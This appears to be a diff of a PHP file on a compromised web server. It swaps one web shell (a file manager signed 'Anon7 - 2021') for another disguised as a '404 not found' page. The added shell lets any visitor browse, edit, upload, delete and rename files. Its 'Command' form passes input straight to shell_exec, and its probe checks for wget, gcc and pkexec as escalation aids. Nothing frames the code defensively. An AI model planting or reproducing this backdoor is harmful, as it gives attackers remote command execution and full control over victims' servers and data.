@@ -1,439 +1,288 @@
-<!DOCTYPE html>
-<html>
-<head>
-	<title>.</title>
-</head>
-<body bgcolor="#1f1f1f" text="#ffffff">
-<link href="" rel="stylesheet" type="text/css">
-<style>
-	@import url('https://fonts.googleapis.com/css?family=Dosis');
-	@import url('https://fonts.googleapis.com/css?family=Bungee');
-body {
-	font-family: "Dosis", cursive;
-	text-shadow:0px 0px 1px #757575;
-}
-
-#content tr:hover {
-	background-color: #636263;
-	text-shadow:0px 0px 10px #fff;
-}
-
-#content .first {
-	background-color: #25383C;
-}
-
-#content .first:hover {
-	background-color: #25383C
-	text-shadow:0px 0px 1px #757575;
-}
-
-table {
-	border: 1px #000000 dotted;
-	table-layout: fixed;
-}
-
-td {
-	word-wrap: break-word;
-}
-
-a {
-	color: #ffffff;
-	text-decoration: none;
-}
-
-a:hover {
-	color: #000000;
-	text-shadow:0px 0px 10px #ffffff;
-}
-
-input,select,textarea {
-	border: 1px #000000 solid;
-	-moz-border-radius: 5px;
-	-webkit-border-radius:5px;
-	border-radius:5px;
-}
-
-.gas {
-	background-color: #1f1f1f;
-	color: #ffffff;
-	cursor: pointer;
-}
-
-select {
-	background-color: transparent;
-	color: #ffffff;
-}
-
-select:after {
-	cursor: pointer;
-}
-
-.linka {
-	background-color: transparent;
-	color: #ffffff;
-}
-
-.up {
-	background-color: transparent;
-	color: #fff;
-}
-
-option {
-	background-color: #1f1f1f;
-}
-
-::-webkit-file-upload-button {
-  background: transparent;
-  color: #fff;
-  border-color: #fff;
-  cursor: pointer;
-}
-</style>
-<center>
-<font face="Bungee" size="5">KGRKJGETMRETU895U-589TY5MIGM5JGB5SDFESFREWTGR54TY</font></center>
-<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td>
-<?php
-set_time_limit(0);
+<html><head><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"><style>@import url('https://fonts.googleapis.com/css?family=Dosis');@import url('https://fonts.googleapis.com/css?family=Bungee');td,th,thead{border:1px solid #fff;padding:5px;box-shadow: 0 0 10px 0 #707070}tr{background-color:#fff}body{font-family:"Dosis",cursive;text-shadow:0px 0px 1px #707070}</style></head><body><center>
+  <?php
 error_reporting(0);
-
-$disfunc = @ini_get("disable_functions");
-if (empty($disfunc)) {
-	$disf = "<font color='gold'>NONE</font>";
-} else {
-	$disf = "<font color='red'>".$disfunc."</font>";
-}
-
-function author() {
-	echo "<center><br>Anon7 - 2021</center>";
-	exit();
-}
-
-function cekdir() {
-	if (isset($_GET['path'])) {
-		$lokasi = $_GET['path'];
-	} else {
-		$lokasi = getcwd();
-	}
-	if (is_writable($lokasi)) {
-		return "<font color='green'>Writeable</font>";
-	} else {
-		return "<font color='red'>Writeable</font>";
-	}
-}
-
-function cekroot() {
-	if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
-		return "<font color='green'>Writeable</font>";
-	} else {
-		return "<font color='red'>Writeable</font>";
-	}
-}
-
-function xrmdir($dir) {
-    $items = scandir($dir);
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') {
-            continue;
-        }
-        $path = $dir.'/'.$item;
-        if (is_dir($path)) {
-            xrmdir($path);
-        } else {
-            unlink($path);
-        }
+$currentPath = getcwd();
+$pathComponents = explode(DIRECTORY_SEPARATOR, $currentPath);
+echo "<font face='Bungee' size='3'><h1>&#128013; 404 not found</h1></font><div class='container'><div id='pw'>Home: ";
+foreach ($pathComponents as $index => $component) {
+    $partialPath = implode(DIRECTORY_SEPARATOR, array_slice($pathComponents, 0, $index + 1));
+    $partialPath = str_replace("%2F", "/", rawurlencode($partialPath));
+    echo "<a href='?path=" . $partialPath . "'>" . $component . "</a>";
+    if ($index < count($pathComponents) - 1) {
+        echo "/";
     }
-    rmdir($dir);
 }
-
-function green($text) {
-	echo "<center><font color='green'>".$text."</center></font>";
-}
-
-function red($text) {
-	echo "<center><font color='red'>".$text."</center></font>";
-}
-
-echo "Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
-echo "System : <font color='gold'>".php_uname()."</font><br>";
-echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
-echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
-echo "Disable Function : ".$disf."</font><br>";
-echo "Directory : &nbsp;";
-
-foreach($_POST as $key => $value){
-	$_POST[$key] = stripslashes($value);
-}
-
-if(isset($_GET['path'])){
-	$lokasi = $_GET['path'];
-	$lokdua = $_GET['path'];
-} else {
-	$lokasi = getcwd();
-	$lokdua = getcwd();
-}
-
-$lokasi = str_replace('\\','/',$lokasi);
-$lokasis = explode('/',$lokasi);
-$lokasinya = @scandir($lokasi);
-
-foreach($lokasis as $id => $lok){
-	if($lok == '' && $id == 0){
-		$a = true;
-		echo '<a href="?path=/">/</a>';
-		continue;
-	}
-	if($lok == '') continue;
-	echo '<a href="?path=';
-	for($i=0;$i<=$id;$i++){
-	echo "$lokasis[$i]";
-	if($i != $id) echo "/";
-} 
-echo '">'.$lok.'</a>/';
-}
-
-echo '</td></tr><tr><td><br>';
-if (isset($_POST['upwkwk'])) {
-	if (isset($_POST['berkasnya'])) {
-		if ($_POST['dirnya'] == "2") {
-			$lokasi = $_SERVER['DOCUMENT_ROOT'];
-		}
-		$data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
-		if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
-			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
-		} else {
-			echo "<font color='red'>Failed to Upload !<br><br>";
-		}
-	} elseif (isset($_POST['linknya'])) {
-		if (empty($_POST['namalink'])) {
-			exit("Filename cannot be empty !");
-		}
-		if ($_POST['dirnya'] == "2") {
-			$lokasi = $_SERVER['DOCUMENT_ROOT'];
-		}
-		$data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
-		if (file_exists($lokasi."/".$_POST['namalink'])) {
-			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
-		} else {
-			echo "<font coloe='red'>Failed to Upload !<br><br>";
-		}
-	}
-}
-
-echo "Upload File : ";
-echo '<form enctype="multipart/form-data" method="post">
-<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
-<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
-<br>
-<input type="hidden" name="upwkwk" value="aplod">
-<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
-<input type="text" name="darilink" class="up" placeholder="https://anon7.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
-</form>';
-echo "</table><br>";
-
-if (isset($_GET['fileloc'])) {
-	echo "<tr><td>Current File : ".$_GET['fileloc'];
-	echo '</tr></td></table><br/>';
-	echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
-	author();
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
-	if (is_dir($_POST['path'])) {
-		xrmdir($_POST['path']);
-		if (file_exists($_POST['path'])) {
-			red("Failed to delete Directory !");
-		} else {
-			green("Delete Directory Success !");
-			echo "string";
-		}
-	} elseif (is_file($_POST['path'])) {
-		@unlink($_POST['path']);
-		if (file_exists($_POST['path'])) {
-			red("Failed to Delete File !");
-		} else {
-			green("Delete File Success !");
-		}
-	}
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
-	echo "<center>".$_POST['path']."<br>";
-	echo '<form method="post">
-	Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
-	<input type="hidden" name="path" value="'.$_POST['path'].'">
-	<input type="hidden" name="pilih" value="ubahmod">
-	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
-	</form>';
-	if (isset($_POST['chm0d'])) {
-		$cm = @chmod($_POST['path'], $_POST['perm']);
-		if ($cm == true) {
-			green("Change Mod Success !");
-		} else {
-			red("Change Mod Failed !");
-		}
-	}
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
-	if (isset($_POST['gantin'])) {
-		$ren = @rename($_POST['path'], $_POST['newname']);
-		if ($ren == true) {
-			green("Change Name Success !");
-		} else {
-			red("Change Name Failed !");
-		}
-	}
-	if (empty($_POST['name'])) {
-		$namaawal = $_POST['newname'];
-	} else {
-		$namawal = $_POST['name'];
-	}
-	echo "<center>".$_POST['path']."<br>";
-	echo '<form method="post">
-	New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
-	<input type="hidden" name="path" value="'.$_POST['path'].'">
-	<input type="hidden" name="pilih" value="gantinama">
-	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
-	</form>';
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
-	if (isset($_POST['gasedit'])) {
-		$edit = @file_put_contents($_POST['path'], $_POST['src']);
-		if ($edit == true) {
-			green("Edit File Success !");
-		} else {
-			red("Edit File Failed !");
-		}
-	}
-	echo "<center>".$_POST['path']."<br><br>";
-	echo '<form method="post">
-	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
-	<input type="hidden" name="path" value="'.$_POST['path'].'">
-	<input type="hidden" name="pilih" value="edit">
-	<input type="submit" value="Edit File" name="gasedit" />
-	</form><br>';
-}
-
-echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr class="first">
-<td><center>Name</center></td>
-<td><center>Size</center></td>
-<td><center>Permissions</center></td>
-<td><center>Options</center></td>
-</tr>';
-
-foreach($lokasinya as $dir){
-	if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
-	echo "<tr>
-	<td><a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
-	<td><center>--</center></td>
-	<td><center>";
-	if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
-	elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
-	echo statusnya($lokasi."/".$dir);
-	if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';
-
-	echo "</center></td>
-	<td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
-	<select name=\"pilih\">
-	<option value=\"\"></option>
-	<option value=\"hapus\">Delete</option>
-	<option value=\"ubahmod\">Chm0d</option>
-	<option value=\"gantinama\">Rename</option>
-	</select>
-	<input type=\"hidden\" name=\"type\" value=\"dir\">
-	<input type=\"hidden\" name=\"name\" value=\"$dir\">
-	<input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
-	<input type=\"submit\" class=\"gas\" value=\">\" />
-	</form></center></td>
-	</tr>";
-}
-
-echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
-foreach($lokasinya as $file) {
-	if(!is_file("$lokasi/$file")) continue;
-	$size = filesize("$lokasi/$file")/1024;
-	$size = round($size,3);
-	if($size >= 1024){
-	$size = round($size/1024,2).' MB';
-} else {
-	$size = $size.' KB';
-}
-
-echo "<tr>
-<td><a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
-<td><center>".$size."</center></td>
-<td><center>";
-if(is_writable("$lokasi/$file")) echo '<font color="green">';
-elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
-echo statusnya("$lokasi/$file");
-if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
-echo "</center></td><td><center>
-<form method=\"post\" action=\"?pilihan&path=$lokasi\">
-<select name=\"pilih\">
-<option value=\"\"></option>
-<option value=\"hapus\">Delete</option>
-<option value=\"ubahmod\">Chm0d</option>
-<option value=\"gantinama\">Rename</option>
-<option value=\"edit\">Edit</option>
-</select>
-<input type=\"hidden\" name=\"type\" value=\"file\">
-<input type=\"hidden\" name=\"name\" value=\"$file\">
-<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
-<input type=\"submit\" class=\"gas\" value=\">\" />
-</form></center></td>
-</tr>";
-}
-echo '</tr></td></table></table>';
-author();
-
-function statusnya($file){
-$statusnya = fileperms($file);
-
-if (($statusnya & 0xC000) == 0xC000) {
-
-// Socket
-$ingfo = 's';
-} elseif (($statusnya & 0xA000) == 0xA000) {
-// Symbolic Link
-$ingfo = 'l';
-} elseif (($statusnya & 0x8000) == 0x8000) {
-// Regular
-$ingfo = '-';
-} elseif (($statusnya & 0x6000) == 0x6000) {
-// Block special
-$ingfo = 'b';
-} elseif (($statusnya & 0x4000) == 0x4000) {
-// Directory
-$ingfo = 'd';
-} elseif (($statusnya & 0x2000) == 0x2000) {
-// Character special
-$ingfo = 'c';
-} elseif (($statusnya & 0x1000) == 0x1000) {
-// FIFO pipe
-$ingfo = 'p';
-} else {
-// Unknown
-$ingfo = 'u';
-}
-
-// Owner
-$ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
-$ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
-$ingfo .= (($statusnya & 0x0040) ?
-(($statusnya & 0x0800) ? 's' : 'x' ) :
-(($statusnya & 0x0800) ? 'S' : '-'));
-
-
-// Group
-$ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
-$ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
-$ingfo .= (($statusnya & 0x0008) ?
-(($statusnya & 0x0400) ? 's' : 'x' ) :
-(($statusnya & 0x0400) ? 'S' : '-'));
-
-// World
-$ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
-$ingfo .= (($statusnya & 0x0002) ? 'w' : '-');
-
-$ingfo .= (($statusnya & 0x0001) ?
-(($statusnya & 0x0200) ? 't' : 'x' ) :
-(($statusnya & 0x0200) ? 'T' : '-'));
-
-return $ingfo;
-}
+echo "</div><br>";
 ?>
+  <form method="GET"><input type="text" name="path" autocomplete="off" size="100" class="textinput" required><input type="submit" class="submit"></form>
+  <?php
+  if (htmlspecialchars(isset($_GET["path"]))) {
+    $path = $_GET["path"];
+    $file = $_GET["file"];
+    $folder = $_GET["folder"];
+    $folder_name = basename($folder);
+    $file_name = basename($file);
+    ?>
+    <script>
+      const path = document.querySelector('input[name=path]')
+      path.value = '<?php echo $_GET["path"]; ?>'
+    </script><a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=createfolder"><button type="button" class="button-tools">+Folder</button></a>
+	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=createfile"><button type="button" class="button-tools">+File</button></a>
+	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawntools"><button type="button" class="button-tools">Spawn ToolKit</button></a>
+    <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=info"><button type="button" class="button-tools">Info Min</button></a>
+	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=upload"><button type="button" class="button-tools">Upload</button></a>
+	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=cmd"><button type="button" class="button-tools">Command</button></a><br><br>
+    <?php
+    if ($_GET["action"] == "view") {
+      echo "<p class='text-center'>Filename: $file_name</p>";
+      echo "<textarea class='textarea' disabled>".htmlspecialchars(file_get_contents($file))."</textarea>";
+    } elseif ($_GET["action"] == "edit" && $file) {
+        ?>
+        <form method="POST"><p>Filename:<?php echo $file_name; ?></p><?php echo "<textarea name='content' class='textarea'>".htmlspecialchars(file_get_contents($file))." </textarea>"; ?><input type="submit" name="edit" class="submit"></form>
+        <?php
+        if (isset($_POST["edit"])) {
+          $editted = base64_encode($_POST["content"]);
+          $save = saveme($file, base64_decode($editted));
+          if ($save) {
+            echo "<script>alert('Edit $file_name success')</script>";
+            echo "<script>window.location = '?path=$path&action=edit&file=$file'</script>";
+          } else {
+            echo "Edit $file_name failed";
+          }
+        }
+      } elseif ($_GET["action"] == "rename" && $file) {
+        renames($file, $path, $file_name);
+      } elseif ($_GET["action"] == "rename" && $folder) {
+        renames($folder, $path, $folder_name);
+      } elseif ($_GET["action"] == "delete" && $file) {
+        if (unlink($file)) {
+          echo "<script>alert('Delete $file_name success')</script>";
+          echo "<script>window.location = '?path=$path'</script>";
+        } else {
+          echo "Delete $file_name failed";
+        }
+      } elseif ($_GET["action"] == "delete" && $folder) {
+        if (is_dir($folder)) {
+          if (is_writable($folder)) {
+            @rmdir($folder);
+            @shell_exec("rm -rf $folder");
+            @shell_exec("rmdir /s /q $folder");
+            echo "<script>alert('$folder_name Deleted')</script>";
+            echo "<script>window.location = '?path=$path'</script>";
+          } else {
+            echo "Delete $folder_name failed";
+          }
+        }
+      } elseif ($_GET["action"] == "spawntools") {
+        $save = saveme($path."/tools.php", base64_decode($tools));
+        echo "<center>";
+        if ($save) {
+          echo "<script>alert('Spawn Toolkit tools.php success')</script>";
+          echo "<script>window.location = '?path=$path'</script>";
+        } else {
+          echo "Spawn Toolkit failed";
+        }
+        echo "</center>";
+      } elseif ($_GET["action"] == "createfile") {
+        ?>
+        <form method="POST"><input type="text" name="filename" class="textinput"><textarea name="filetext" class="textarea"></textarea><input type="submit" name="touch" class="submit"></form>
+        <?php
+        if (isset($_POST["touch"])) {
+          $filename = $_POST["filename"];
+          $filetext = base64_encode($_POST["filetext"]);
+          $save = saveme($path."/".$filename, base64_decode($filetext));
+          if ($save) {
+            echo "<script>alert('".$filename." has successfully created')</script>";
+            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
+          } else {
+            echo "Create file failed";
+          }
+        }
+      } elseif ($_GET["action"] == "createfolder") {
+        ?>
+        <form method="POST"><input type="text" name="foldername" autocomplete="off" class="inputtext textinput"><input type="submit" name="cfolder" class="submit"></form>
+        <?php
+        if (isset($_POST["cfolder"])) {
+          $fname = $_POST["foldername"];
+          if (@mkdir($path."/".$fname)) {
+            echo "<script>alert('$fname Created')</script>";
+            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
+          } else {
+            echo "Create folder failed";
+          }
+        }
+      } elseif ($_GET["action"] == "upload") {
+        ?>
+        <form method="POST" enctype="multipart/form-data"><input type="file" name="nax_file" id="naxx"><input type="submit" name="upkan" class="submit"></form>
+        <?php
+        if (isset($_POST["upkan"])) {
+          if (move_uploaded_file($_FILES["nax_file"]["tmp_name"], $path."/".$_FILES["nax_file"]["name"])) {
+            $file = $_FILES["nax_file"]["name"];
+            echo "<script>alert('$file uploaded')</script>";
+            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
+          } else {
+            echo "<center>Upload fail</center>";
+          }
+        }
+      } elseif ($_GET["action"] == "cmd") {
+        ?>
+        <form method="POST"><input type="text" name="cmd" autocomplete="off" size="100" class="inputtext textinput"><input type="submit" name="exec" class="submit"></form>
+        <?php
+        if (isset($_POST["exec"])) {
+          $cmd = $_POST["cmd"];
+          echo "<div class='cmd'>".@shell_exec($cmd)."</div>";
+        }
+      } elseif ($_GET["action"] == "info") {
+        echo '<div class="wrap">';
+        infomin();
+        echo '</div>';
+      } else {
+          ?>
+          <div class="wrap"><table><thead><tr><th>Items</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead><tbody>
+                <?php
+                $scan = scandir($path);
+                foreach ($scan as $folders) {
+                  if (!is_dir($path."/".$folders) || $folders == ".." || $folders == ".") {
+                    continue;
+                  }
+                  ?>
+                  <tr><td nowrap="nowrap" width="450"><?php echo "<a href='?path=$path/$folders'><i class='fas fa-folder'></i> $folders</a>"; ?></td><td nowrap="nowrap" width="100">---</td><td nowrap="nowrap" width="150">
+                        <?php
+                        if (is_writable($path."/".$folders)) {
+                          $color = "lime";
+                        } else {
+                          $color = "red";
+                        }
+                        echo "<font color='$color'>".hi_permission($path."/".$folders)."</font>";
+                        ?>
+                    </td><td nowrap="nowrap" width="90">
+                      <?php echo "
+            <a href='?path=$path&action=rename&folder=$path/$folders'><i class='fas fa-pen'></i></a><a href='?path=$path&action=delete&folder=$path/$folders'><i class='fas fa-trash-alt'></i></a>
+            "; ?>
+                    </td></tr>
+                  <?php
+                }
+                foreach ($scan as $files) {
+                  if (is_file($path."/".$files)) {
+                    ?>
+                    <tr><td nowrap="nowrap" width="450"><?php echo "<a href='?path=$path&action=view&file=$path/$files'><i class='fas fa-file'></i> $files</a>"; ?></td><td nowrap="nowrap" width="100"><?php echo "".Size($path."/".$files).""; ?></td><td nowrap="nowrap" width="150">
+                          <?php
+                          if (is_writable($path."/".$files)) {
+                            $color = "lime";
+                          } else {
+                            $color = "red";
+                          }
+                          echo "<font color='$color'>".hi_permission($path."/".$folders)."</font>";
+                          ?>
+                      </td><td nowrap="nowrap" width="90">
+                        <?php echo "
+              <a href='?path=$path&action=edit&file=$path/$files'><i class='fas fa-edit'></i></a><a href='?path=$path&action=rename&file=$path/$files'><i class='fas fa-pen'></i></a><a href='?path=$path&action=delete&file=$path/$files'><i class='fas fa-trash-alt'></i></a>
+              "; ?>
+                      </td></tr>
+                    <?php
+                  }
+                }
+                echo "</tbody></table></div>";
+              }
+            }
+          function saveme($name, $content) {
+            $open = fopen($name, "w");
+            fwrite($open, $content);
+            fclose($open);
+            return $open;
+          }
+          function renames($item, $path, $name) {
+            ?>
+            <form method="POST"><input type="text" name="newname" value="<?php echo $name; ?>" size="50" class="textinput inputtext"><input type="submit" name="rename" class="submit"></form>
+            <?php
+            if (isset($_POST["rename"])) {
+              $new = $_POST["newname"];
+              if (rename($item, $path."/".$new)) {
+                echo "<script>alert('$name successfully renamed')</script>";
+                echo "<script>window.location = '?path=$path'</script>";
+              } else {
+                echo "Rename failed";
+              }
+            }
+          }
+          function Size($path) {
+            $bytes = sprintf('%u', filesize($path));
+            if ($bytes > 0) {
+              $unit = intval(log($bytes, 1024));
+              $units = array('B', 'KB', 'MB', 'GB');
+              if (array_key_exists($unit, $units) === true) {
+                return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
+              }
+            }
+            return $bytes;
+          }
+          function infomin() {
+            $curl = (function_exists("curl_version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $wget = (@shell_exec("wget --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $python = (@shell_exec("python --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $perl = (@shell_exec("perl --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $ruby = (@shell_exec("ruby --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $gcc = (@shell_exec("gcc --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+            $disfuncs = @ini_get("disable_functions");
+            $showit = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
+            echo "<div class='infomin wrap'>";
+            echo "OS : ".php_uname()."<br>";
+            echo "SERVER IP : ".$_SERVER["SERVER_ADDR"]."<br>";
+            echo "SOFTWARE : ".$_SERVER["SERVER_SOFTWARE"]."<br>";
+            echo "Disabled Functions : $showit<br>";
+            echo "CURL : $curl | WGET : $wget | PERL : $perl | RUBY : $ruby | PYTHON : $python | GCC : $gcc | PKEXEC : $pkexec";
+            echo "</div>";
+          }
+
+          function hi_permission($items) {
+            $perms = fileperms($items);
+            if (($perms & 0xC000) == 0xC000) {
+              $info = 's';
+            } elseif (($perms & 0xA000) == 0xA000) {
+              $info = 'l';
+            } elseif (($perms & 0x8000) == 0x8000) {
+              $info = '-';
+            } elseif (($perms & 0x6000) == 0x6000) {
+              $info = 'b';
+            } elseif (($perms & 0x4000) == 0x4000) {
+              $info = 'd';
+            } elseif (($perms & 0x2000) == 0x2000) {
+              $info = 'c';
+            } elseif (($perms & 0x1000) == 0x1000) {
+              $info = 'p';
+            } else {
+              $info = 'u';
+            }
+            $info .= (($perms & 0x0100) ? 'r' : '-');
+            $info .= (($perms & 0x0080) ? 'w' : '-');
+            $info .= (($perms & 0x0040) ?
+              (($perms & 0x0800) ? 's' : 'x') :
+              (($perms & 0x0800) ? 'S' : '-'));
+            $info .= (($perms & 0x0020) ? 'r' : '-');
+            $info .= (($perms & 0x0010) ? 'w' : '-');
+            $info .= (($perms & 0x0008) ?
+              (($perms & 0x0400) ? 's' : 'x') :
+              (($perms & 0x0400) ? 'S' : '-'));
+            $info .= (($perms & 0x0004) ? 'r' : '-');
+            $info .= (($perms & 0x0002) ? 'w' : '-');
+            $info .= (($perms & 0x0001) ?
+              (($perms & 0x0200) ? 't' : 'x') :
+              (($perms & 0x0200) ? 'T' : '-'));
+            return $info;
+          }
+          ?>
+        </div><script>
+          const file = document.querySelector('input[type="file"]')
+          const label = document.querySelector('label[for="naxx"]')
+          file.addEventListener('change', () => {
+            if (file.value.length == '0') {
+              label.innerText = 'Choose File Here'
+            } else if (file.value.length >= '30') {
+              value = file.value.substring(0, 30) + "..."
+              label.innerText = value
+            } else {
+              label.innerText = file.value
+            }
+          })
+        </script></body></html>
